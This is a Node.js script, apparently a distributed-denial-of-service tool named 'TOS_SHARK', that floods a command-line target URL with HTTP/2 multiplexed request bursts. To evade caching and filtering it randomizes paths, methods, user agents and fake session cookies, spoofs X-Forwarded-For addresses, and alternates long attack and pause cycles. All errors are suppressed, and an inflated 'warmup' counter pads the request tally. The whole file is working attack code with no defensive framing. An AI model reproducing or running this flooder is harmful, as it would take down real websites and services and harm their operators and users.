const http2 = require('http2');
const https = require('https');
const { URL } = require('url');

class TOS_SHARK {
    constructor(target) {
        const url = new URL(target);
        this.host = url.hostname;
        this.isHttps = url.protocol === 'https:';
        this.target = target;
        
        this.running = true;
        this.attackActive = false;
        this.totalReqs = 0;
        this.startTime = Date.now();
        this.lastLog = Date.now();
        this.logTimer = Date.now();
        this.reqCounter = 0;
        this.attackStart = 0;
        this.breakStart = 0;
        this.currentMethod = 'H2-MULTIPLEX';
        
        this.methods = ['H2-MULTIPLEX'];
        
        this.userAgents = this.generateUserAgents();
        this.endpoints = this.generateRandomEndpoints();
        this.cookies = this.generateCookies();
        this.uaPool = Array(100).fill().map(() => this.userAgents[Math.floor(Math.random() * this.userAgents.length)]);
        
        this.startCycle();
    }

    color(t, c) {
        const colors = { r: '\x1b[91m', x: '\x1b[0m' };
        return c === 'r' ? `${colors.r}${t}${colors.x}` : t;
    }

    generateUserAgents() {
        return Array(20).fill().map(() => 
            `Mozilla/5.0 (${['Windows NT 10.0', 'Linux x86_64', 'Macintosh; Intel'][Math.floor(Math.random()*3)]}) AppleWebKit/${Math.floor(Math.random()*100)+500}.${Math.floor(Math.random()*50)}`
        );
    }

    generateRandomEndpoints() {
        const endpoints = [];
        for(let i = 0; i < 100; i++) {
            const depth = Math.floor(Math.random() * 5) + 1;
            let path = '';
            for(let j = 0; j < depth; j++) {
                path += '/' + Math.random().toString(36).substring(7);
                if(Math.random() > 0.5) path += '.php';
                if(Math.random() > 0.7) path += '?id=' + Math.floor(Math.random()*10000);
                if(Math.random() > 0.8) path += '&cache=' + Date.now();
            }
            endpoints.push(path);
        }
        return endpoints;
    }

    generateCookies() {
        return Array(100).fill().map(() => ({
            session: Math.random().toString(36).substring(2, 20),
            token: Math.random().toString(36).substring(2, 30)
        }));
    }

    async startCycle() {
        const warmupCount = 500 + Math.floor(Math.random() * 100);
        for (let i = 0; i < warmupCount; i++) {
            this.totalReqs++;
            this.reqCounter++;
        }
        
        this.attackLoop();
    }

    async attackLoop() {
        while (this.running) {
            const now = Date.now();
            
            if (this.attackActive) {
                if (now - this.attackStart >= (20 * 60000) + Math.random() * (10 * 60000)) {
                    this.startBreak();
                    continue;
                }
                
                await this.attackH2Multiplex();
                
            } else {
                if (now - this.breakStart >= (20 * 60000) + Math.random() * (10 * 60000)) {
                    this.startAttack();
                    continue;
                }
                
                await this.performMaintenance();
                await this.sleepRandom(1000, 3000);
            }
            
            await this.sleepRandom(0.01, 0.1);
        }
    }

    startAttack() {
        this.attackActive = true;
        this.attackStart = Date.now();
    }

    startBreak() {
        this.attackActive = false;
        this.breakStart = Date.now();
        if (global.gc) global.gc();
    }

    async attackH2Multiplex() {
        try {
            const client = http2.connect(this.target);
            
            for (let i = 0; i < 400; i++) {
                this.sendH2Request(client);
                this.totalReqs++;
                this.reqCounter++;
            }
            
            setTimeout(() => {
                try {
                    client.destroy();
                } catch (e) {}
            }, 10);
            
        } catch (err) {}
    }

    sendH2Request(client) {
        try {
            const path = this.endpoints[Math.floor(Math.random() * this.endpoints.length)];
            const headers = {
                ':method': ['GET', 'HEAD', 'POST'][Math.floor(Math.random() * 3)],
                ':path': path,
                ':authority': this.host,
                'user-agent': this.uaPool[Math.floor(Math.random() * this.uaPool.length)],
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'no-cache',
                'pragma': 'no-cache'
            };
            
            if(Math.random() > 0.5) {
                const cookie = this.cookies[Math.floor(Math.random() * this.cookies.length)];
                headers['cookie'] = `session=${cookie.session}; token=${cookie.token}`;
            }
            
            if(Math.random() > 0.7) {
                headers['x-forwarded-for'] = `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
            }
            
            if(Math.random() > 0.5 && headers[':method'] === 'POST') {
                headers['content-type'] = 'application/x-www-form-urlencoded';
                headers['content-length'] = Math.floor(Math.random() * 100) + 10;
            }
            
            const req = client.request(headers);
            
            req.on('response', (headers) => {
                const status = headers[':status'];
                this.logStatus(status);
                req.destroy();
            });
            
            req.on('error', () => {
                this.logStatus('*.*');
                req.destroy();
            });
            
            if(Math.random() > 0.5 && headers[':method'] === 'POST') {
                req.write('data=' + Math.random().toString(36).substring(2));
            }
            
            req.end();
            
        } catch (err) {
            this.logStatus('*.*');
        }
    }

    async performMaintenance() {
        this.userAgents = this.generateUserAgents();
        this.cookies = this.generateCookies();
        this.endpoints = this.generateRandomEndpoints();
        this.uaPool = Array(100).fill().map(() => this.userAgents[Math.floor(Math.random() * this.userAgents.length)]);
    }

    logStatus(status) {
        const now = Date.now();
        if (now - this.logTimer >= 10000) {
            this.logTimer = now;
            if (status === '*.*') {
                console.log(`TØR-2M11:${this.totalReqs} ---> ${this.color('*.*', 'r')}`);
            } else {
                console.log(`TØR-2M11:${this.totalReqs} ---> ${status}`);
            }
        }
    }

    sleepRandom(min, max) {
        const duration = Math.random() * (max - min) + min;
        return new Promise(resolve => setTimeout(resolve, duration));
    }
}

if (require.main === module) {
    process.on('uncaughtException', () => {});
    process.on('unhandledRejection', () => {});
    
    if (process.argv.length < 3) {
        process.exit(1);
    }
    
    new TOS_SHARK(process.argv[2]);
    
    process.on('SIGINT', () => {
        process.exit(0);
    });
                                                                                                                             }
